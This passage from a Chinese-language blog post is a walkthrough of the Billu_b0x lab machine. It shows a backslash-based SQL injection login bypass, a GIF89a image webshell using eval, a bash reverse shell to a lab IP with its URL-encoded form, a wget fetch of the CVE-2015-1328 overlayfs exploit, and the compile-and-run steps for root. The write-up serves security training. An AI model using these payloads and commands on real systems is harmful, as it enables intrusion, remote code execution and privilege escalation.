+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line"><span class="variable">$run</span>=<span class="string">&#x27;select * from auth where pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>过滤项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>单引号 <code>&#39;</code></td>
+<td>替换为空，无法直接闭合字符串</td>
+</tr>
+<tr>
+<td>反斜杠 <code>\</code></td>
+<td><strong>未过滤</strong>，可用于转义 SQL 中的闭合引号</td>
+</tr>
+</tbody></table>
+<h3 id="3-2-sqlmap-字典跑注入"><a href="#3-2-sqlmap-字典跑注入" class="headerlink" title="3.2 sqlmap 字典跑注入"></a>3.2 sqlmap 字典跑注入</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521163204315.png" alt="image-20260521163204315"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521163140882.png" alt="image-20260521163140882"></p>
+<p>多个 payload 返回 302 跳转（即登录成功）：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521165332301.png" alt="image-20260521165332301"></p>
+<h3 id="3-3-手工注入绕过"><a href="#3-3-手工注入绕过" class="headerlink" title="3.3 手工注入绕过"></a>3.3 手工注入绕过</h3><p>使用 <code>\</code> 作为用户名、<code>or 0=0 #</code> 作为密码，成功绕过登录：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521165456847.png" alt="image-20260521165456847"></p>
+<p><strong>原理</strong>：用户名中的 <code>\</code> 将 SQL 语句中 uname 值的闭合引号转义，使密码字段的结尾单引号成为 uname 字符串的一部分，令 <code>or 0=0 #</code> 条件生效并注释掉剩余 SQL。</p>
+<h3 id="3-4-进入后台"><a href="#3-4-进入后台" class="headerlink" title="3.4 进入后台"></a>3.4 进入后台</h3><p>登录成功后进入 panel.php，可见两个已有用户及用户管理功能：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521165531108.png" alt="image-20260521165531108"></p>
+<p>“Add User” 功能包含图片上传：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521165658110.png" alt="image-20260521165658110"></p>
+<hr>
+<h2 id="四、文件上传-文件包含-Getshell"><a href="#四、文件上传-文件包含-Getshell" class="headerlink" title="四、文件上传 + 文件包含 Getshell"></a>四、文件上传 + 文件包含 Getshell</h2><h3 id="4-1-上传过滤分析"><a href="#4-1-上传过滤分析" class="headerlink" title="4.1 上传过滤分析"></a>4.1 上传过滤分析</h3><p>直接上传 PHP 一句话木马被拦截，提示只能上传 <code>png/jpg/gif</code>：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521165730390.png" alt="image-20260521165730390"></p>
+<p>抓包分析，发现存在三层过滤：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521165934282.png" alt="image-20260521165934282"></p>
+<table>
+<thead>
+<tr>
+<th>过滤层</th>
+<th>检查内容</th>
+<th>绕过方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MIME Type</td>
+<td><code>Content-Type</code> 必须为 <code>image/*</code></td>
+<td>修改 Content-Type 为 <code>image/gif</code></td>
+</tr>
+<tr>
+<td>文件扩展名</td>
+<td>仅允许 <code>.png</code>、<code>.jpg</code>、<code>.gif</code></td>
+<td>文件名改为 <code>.gif</code> 或以图片扩展名结尾</td>
+</tr>
+<tr>
+<td>文件头 Magic Bytes</td>
+<td>必须为合法图片文件头</td>
+<td>文件开头写入 <code>GIF89a</code></td>
+</tr>
+</tbody></table>
+<h3 id="4-2-图片马制作与上传"><a href="#4-2-图片马制作与上传" class="headerlink" title="4.2 图片马制作与上传"></a>4.2 图片马制作与上传</h3><p>在 GIF 文件头后追加一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521170333669.png" alt="image-20260521170333669"></p>
+<p>上传成功，文件位于 <code>/uploaded_images/</code> 目录：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521170355524.png" alt="image-20260521170355524"></p>
+<h3 id="4-3-发现文件包含入口"><a href="#4-3-发现文件包含入口" class="headerlink" title="4.3 发现文件包含入口"></a>4.3 发现文件包含入口</h3><p>抓包发现 <code>panel.php</code> 通过 <code>?load=add</code> 参数加载 <code>add.php</code> 的内容——这是一个文件包含点：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521170919400.png" alt="image-20260521170919400"></p>
+<p>验证可包含系统文件：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521171725852.png" alt="image-20260521171725852"></p>
+<h3 id="4-4-执行图片马获取-RCE"><a href="#4-4-执行图片马获取-RCE" class="headerlink" title="4.4 执行图片马获取 RCE"></a>4.4 执行图片马获取 RCE</h3><p>文件包含图片马时文件被当作文本输出。改用直接 URL 访问图片马，配合 GET 参数的一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过 <code>a</code> 参数传入 URL 编码的命令，成功执行：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521193907914.png" alt="image-20260521193907914"></p>
+<h3 id="4-5-反弹-Shell"><a href="#4-5-反弹-Shell" class="headerlink" title="4.5 反弹 Shell"></a>4.5 反弹 Shell</h3><p>Kali 监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
+
+<p>通过图片马执行反弹 shell，命令 URL 编码规避特殊字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原始命令: echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.137.148/8888 0&gt;&amp;1&quot; | bash</span><br><span class="line"></span><br><span class="line">URL 编码:  %65%63%68%6f%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%33%37%2e%31%34%38%2f%38%38%38%38%20%30%3e%26%31%22%20%7c%20%62%61%73%68</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521194516817.png" alt="image-20260521194516817"></p>
+<p>成功收到反弹 Shell，当前用户为 <code>www-data</code>：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521194546096.png" alt="image-20260521194546096"></p>
+<h3 id="4-6-Getshell-方法汇总"><a href="#4-6-Getshell-方法汇总" class="headerlink" title="4.6 Getshell 方法汇总"></a>4.6 Getshell 方法汇总</h3><table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>技术</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>绕过上传过滤</td>
+<td>图片马 (GIF89a header)</td>
+<td>MIME + 扩展名 + 文件头三重过滤均可绕过</td>
+</tr>
+<tr>
+<td>执行 PHP 代码</td>
+<td>一句话木马 <code>@eval($_GET[&quot;a&quot;])</code></td>
+<td>直接 URL 访问图片马传参</td>
+</tr>
+<tr>
+<td>反弹 Shell</td>
+<td><code>bash -i &gt;&amp; /dev/tcp/...</code> + URL 编码</td>
+<td>避免 GET 参数中特殊字符被截断</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="五、信息收集（提权准备）"><a href="#五、信息收集（提权准备）" class="headerlink" title="五、信息收集（提权准备）"></a>五、信息收集（提权准备）</h2><h3 id="5-1-系统信息"><a href="#5-1-系统信息" class="headerlink" title="5.1 系统信息"></a>5.1 系统信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@indishell:/var/www$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux indishell 3.13.0-32-generic <span class="comment">#57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux</span></span><br><span class="line"></span><br><span class="line">www-data@indishell:/var/www$ <span class="built_in">cat</span> /etc/issue</span><br><span class="line">Ubuntu 12.04.5 LTS \n \l</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>信息项</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>主机名</td>
+<td>indishell</td>
+</tr>
+<tr>
+<td>内核版本</td>
+<td>3.13.0-32-generic</td>
+</tr>
+<tr>
+<td>系统版本</td>
+<td>Ubuntu 12.04.5 LTS (Precise Pangolin)</td>
+</tr>
+<tr>
+<td>架构</td>
+<td>i686 (32-bit)</td>
+</tr>
+</tbody></table>
+<h3 id="5-2-内核漏洞搜索"><a href="#5-2-内核漏洞搜索" class="headerlink" title="5.2 内核漏洞搜索"></a>5.2 内核漏洞搜索</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu kernel 3.13.0-32</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521194953594.png" alt="image-20260521194953594"></p>
+<p>匹配到 CVE-2015-1328（overlayfs 本地提权），exploit 编号 37292。</p>
+<hr>
+<h2 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h2><h3 id="6-1-漏洞原理"><a href="#6-1-漏洞原理" class="headerlink" title="6.1 漏洞原理"></a>6.1 漏洞原理</h3><p>CVE-2015-1328 是 Linux kernel overlayfs 文件系统的本地提权漏洞。<code>ovl_setattr</code> 函数在设置文件属性时未正确检查权限，允许非特权用户创建具有 root 所有权的文件，进而通过 SUID 二进制文件提权。</p>
+<h3 id="6-2-漏洞利用"><a href="#6-2-漏洞利用" class="headerlink" title="6.2 漏洞利用"></a>6.2 漏洞利用</h3><p><strong>第 1 步</strong> — Kali 下载 exploit 并开启 HTTP 服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 37292</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521195127914.png" alt="image-20260521195127914"></p>
+<p><strong>第 2 步</strong> — 靶机下载到 <code>/tmp</code>（<code>/var/www</code> 无写入权限）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.137.148/37292.c</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521195446851.png" alt="image-20260521195446851"></p>
+<p><strong>第 3 步</strong> — 编译并执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc 37292.c -o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521195600848.png" alt="image-20260521195600848"></p>
+<p><strong>第 4 步</strong> — 提权成功，获得 root shell：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521195728865.png" alt="image-20260521195728865"></p>
+<h3 id="6-3-提权方法汇总"><a href="#6-3-提权方法汇总" class="headerlink" title="6.3 提权方法汇总"></a>6.3 提权方法汇总</h3><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>漏洞编号</th>
+<th>前提条件</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>overlayfs 本地提权</td>
+<td>CVE-2015-1328</td>
+<td>内核 3.13.0-32, 可编译 C 程序</td>
+<td>✅ 成功，直接 root</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><h3 id="攻击链回顾"><a href="#攻击链回顾" class="headerlink" title="攻击链回顾"></a>攻击链回顾</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">主机发现（arp-scan）</span><br><span class="line">  → 端口扫描（全端口 + 服务版本 + 漏洞脚本）</span><br><span class="line">  → 目录枚举（dirsearch / dirb）</span><br><span class="line">  → phpinfo 泄露（/in.php）</span><br><span class="line">  → test.php 文件包含（LFI）</span><br><span class="line">     → 读取 index.php 源码 → SQL 注入（\ 转义绕过单引号过滤）</span><br><span class="line">     → 读取 add.php 源码    → 文件上传功能</span><br><span class="line">     → 读取 /etc/passwd     → 确认普通用户 ica</span><br><span class="line">  → SQL 注入绕过登录 → 进入后台 panel.php</span><br><span class="line">  → 图片马上传（绕过 MIME + 扩展名 + 文件头三层过滤）</span><br><span class="line">  → 一句话木马 @eval 执行 → 反弹 shell（URL 编码）</span><br><span class="line">  → 内核信息收集（uname / kernel 3.13.0-32）</span><br><span class="line">  → searchsploit 匹配 CVE-2015-1328（overlayfs）</span><br><span class="line">  → 编译执行 exploit → root</span><br></pre></td></tr></table></figure>
+
+<h3 id="关键漏洞点"><a href="#关键漏洞点" class="headerlink" title="关键漏洞点"></a>关键漏洞点</h3><table>
+<thead>
+<tr>
+<th>漏洞</th>
+<th>说明</th>
+<th>危害</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>敏感信息泄露</td>
+<td><code>/in.php</code> 直接输出 phpinfo()</td>
+<td>泄露服务器配置、绝对路径</td>
+</tr>
+<tr>
+<td>文件包含 (LFI)</td>
+<td>test.php 未限制包含路径</td>
+<td>读取任意 PHP 源码及系统文件</td>
+</tr>
+<tr>
+<td>源码泄露</td>
+<td>通过 LFI 读取 index.php &#x2F; add.php 逻辑</td>
+<td>暴露 SQL 查询和上传处理逻辑</td>
+</tr>
+<tr>
+<td>SQL 注入</td>
+<td>单引号过滤可被 <code>\</code> 转义绕过</td>
+<td>登录绕过进入后台</td>
+</tr>
+<tr>
+<td>文件上传过滤不足</td>
+<td>仅检查 MIME + 扩展名 + 文件头</td>
+<td>图片马绕过，上传 PHP webshell</td>
+</tr>
+<tr>
+<td>文件包含执行</td>
+<td>panel.php <code>?load=</code> 参数未限制</td>
+<td>可包含上传的图片马实现 RCE</td>
+</tr>
+<tr>
+<td>内核提权</td>
+<td>CVE-2015-1328 (overlayfs)</td>
+<td>www-data → root</td>
+</tr>
+</tbody></table>
+<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><ol>
+<li><strong>LFI 是信息收集的最高效手段</strong> — 一个 test.php 的文件包含漏洞直接读出了登录逻辑和上传逻辑的源码，相当于把整个应用的设计摊开给你看</li>
+<li><strong>源码审计比盲目 fuzz 高效</strong> — 读 index.php 源码后，<code>\</code> 绕过单引号过滤的思路变得显而易见，比用 sqlmap 跑字典更有针对性</li>
+<li><strong>图片马几乎防不住</strong> — 只要允许上传图片且上传目录能执行 PHP，MIME + 扩展名 + 文件头三层过滤等于形同虚设</li>
+<li><strong>文件包含 + 文件上传组合拳</strong> — 单独的文件上传或文件包含可能都不致命，但两者结合是最快 getshell 路径</li>
+<li><strong>老系统提权靠内核</strong> — Ubuntu 12.04 + kernel 3.13 的公开 exploit 命中率极高，searchsploit 一把出结果</li>
+<li><strong>权限目录要记住</strong> — <code>/var/www</code> 无写入权限时，<code>/tmp</code> 是恒久的下载&#x2F;编译阵地</li>
+</ol>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/images/avatar.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/images/avatar.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">cHr1s</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2026/05/21/Billu_b0x/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2026/05/21/Billu_b0x/')">Billu_b0x 靶场通关记录</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2026/05/21/Billu_b0x/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Billu_b0x 靶场通关记录&amp;url=http://example.com/2026/05/21/Billu_b0x/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">cHr1s's bolg</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>SQL注入<span class="tagsPageCount">4</span></a><a class="post-meta__box__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>文件上传<span class="tagsPageCount">2</span></a><a class="post-meta__box__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>文件包含<span class="tagsPageCount">2</span></a><a class="post-meta__box__tags" href="/tags/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>内核提权<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/LFI/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>LFI<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/Getshell/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Getshell<span class="tagsPageCount">1</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="/images/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2026/05/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;&amp;%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/" onerror="onerror=null;src='/cover/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">命令执行 &amp; 代码执行</div></div></a></div><div class="next-post pull-right"><a href="/2026/05/21/Gemini-Pentest-V2/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/" onerror="onerror=null;src='/cover/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Gemini-Pentest-V2 靶场通关记录</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2026/05/16/ai-web/" title="AI-Web 靶机实战记录"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-05-16</div><div class="title">AI-Web 靶机实战记录</div></div></a></div><div><a href="/2026/05/14/sqli-lib/" title="sqli-labs 靶场笔记"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-05-14</div><div class="title">sqli-labs 靶场笔记</div></div></a></div><div><a href="/2026/05/15/sqlmap/" title="SQLMap 使用指南"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-05-15</div><div class="title">SQLMap 使用指南</div></div></a></div><div><a href="/2026/05/19/upload-libs/" title="Upload-Labs 文件上传漏洞靶场笔记"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-05-19</div><div class="title">Upload-Labs 文件上传漏洞靶场笔记</div></div></a></div><div><a href="/2026/05/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-05-19</div><div class="title">文件包含漏洞</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/images/loading.gif" alt="status"/></div></div><div class="author-info__description">cHr1s的博客</div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content"><h2>🎉欢迎<br></h2>
+<p>本站托管于github, 加载缓慢请耐心等待，欢迎大家畅所欲言。</p>
+
+<hr style="border: 1px solid black; background-color: black;">
+
